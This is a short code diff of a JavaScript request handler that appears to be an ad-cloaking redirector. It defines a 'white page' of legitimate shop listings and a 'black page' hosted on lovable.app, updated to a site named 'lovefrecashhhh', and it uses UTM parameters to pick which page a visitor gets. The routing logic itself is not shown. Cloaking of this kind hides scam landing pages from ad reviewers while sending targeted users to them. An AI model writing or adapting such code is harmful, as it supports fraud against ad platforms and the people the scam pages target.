@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.pepejeans.com/en_be/slim-fit-mid-rise-jeans---hatch-PM208398.html?dwvar_PM208398_wash=6FM&dwvar_PM208398_color=000&cgid=pjgbemj1&start=3";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/super-solu-hundebuggy-klappbarer-hundewagen-mit-netzfenstern-fuer-hunde-bis-36-kg-haustierwagen-fuer-mittelgrosse-hunde-p05-1-tlg-dunkelgruen-pet-stroller-feststellbremse-leicht-und-robust-S08FH0UO/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
